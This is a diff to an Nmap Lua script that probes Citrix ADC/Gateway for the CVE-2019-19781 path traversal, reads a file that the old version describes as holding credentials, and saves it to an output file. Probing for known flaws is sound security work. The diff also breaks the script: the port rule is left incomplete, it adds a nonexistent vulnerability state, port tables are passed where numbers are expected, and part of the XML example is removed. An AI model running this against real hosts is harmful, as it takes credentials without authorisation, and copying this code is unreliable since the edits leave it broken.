@@ -1,14 +1,13 @@
 local http = require "http"
 local stdnse = require "stdnse"
 local shortport = require "shortport"
-local table = require "table"
 local string = require "string"
 local vulns = require "vulns"
 local nmap = require "nmap"
 local io = require "io"
 
 description = [[
-This NSE script checks whether the traget server is vulnerable to CVE-2019-19781
+This NSE script checks whether the target server is vulnerable to CVE-2019-19781
 ]]
 ---
 -- @usage
@@ -23,12 +22,11 @@ This NSE script checks whether the traget server is vulnerable to CVE-2019-19781
 -- 16-01-2020 - Author: Dhiraj Mishra (@RandomDhiraj)
 -- 17-12-2019 - Discovery: Mikhail Klyuchnikov (@__Mn1__)
 -- @xmloutput
--- <table key="NMAP-1">
 -- <elem key="title">Citrix ADC Path Traversal aka (Shitrix)</elem>
 -- <elem key="state">VULNERABLE</elem>
 -- <table key="description">
 -- <elem>Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0 are vulnerable to a unauthenticated path 
--- traversal vulnerability that allows attackers to read configurations or any other file.
+-- traversal vulnerability that allows attackers to read configurations or any other file.</elem>
 -- </table>
 -- <table key="dates">
 -- <table key="disclosure">
@@ -49,15 +47,15 @@ This NSE script checks whether the traget server is vulnerable to CVE-2019-19781
 author = "Dhiraj Mishra (@RandomDhiraj)"
 Discovery = "Mikhail Klyuchnikov (@__Mn1__)"
 license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
-categories = {"discovery", "intrusive","vuln"}
+categories = {"discovery","exploit","vuln"}
 
-portrule = shortport.ssl
+portrule = shortport.
 
 action = function(host,port)
-  local outputFile = stdnse.get_script_args(SCRIPT_NAME..".output") or nil
+  local outputFile = stdnse.get_script_args(SCRIPT_NAME..".output")
   local vuln = {
     title = 'Citrix ADC Path Traversal',
-    state = vulns.STATE.NOT_VULN,
+    state = vulns.STATE.NOT_EXPLOIT,
     description = [[
 	Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0 are vulnerable 
 	to a unauthenticated path traversal vulnerability that allows attackers to read configurations or any other file.
@@ -80,7 +78,7 @@ action = function(host,port)
   local credentials
   local citrixADC
 	
-  response = http.get(host, port.number, path)  
+  response = http.get(host, port, path)  
 
   if not response.status then
     stdnse.print_debug("Request Failed")
@@ -89,14 +87,14 @@ action = function(host,port)
   if response.status == 200 then
     if string.match(response.body, match) then
       stdnse.print_debug("%s: %s GET %s - 200 OK", SCRIPT_NAME,host.targetname or host.ip, path)
-      vuln.state = vulns.STATE.VULN
-      citrixADC = (("Path traversal: https://%s:%d%s"):format(host.targetname or host.ip,port.number, path))
+      vuln.state = vulns.STATE.EXPLOIT
+      citrixADC = (("Path traversal: https://%s:%d%s"):format(host.targetname or host.ip,port, path))
 		
       if outputFile then
         credentials = response.body:gsub('%W','.')
 	vuln.check_results = stdnse.format_output(true, citrixADC)
-        vuln.extra_info = stdnse.format_output(true, "Credentials are being stored in the output file")
-	file = io.open(outputFile, "a")
+        vuln.extra_info = stdnse.format_output(true, "Output are being stored in a file")
+	file = io.open(outputFile, "w")
 	file:write(credentials, "\n")
       else
         vuln.check_results = stdnse.format_output(true, citrixADC)
@@ -104,7 +102,7 @@ action = function(host,port)
     end
   elseif response.status == 403 then
     stdnse.print_debug("%s: %s GET %s - %d", SCRIPT_NAME, host.targetname or host.ip, path, response.status)
-    vuln.state = vulns.STATE.NOT_VULN
+    vuln.state = vulns.STATE.NOT_EXPLOIT
   end
 
   return vuln_report:make_output(vuln)
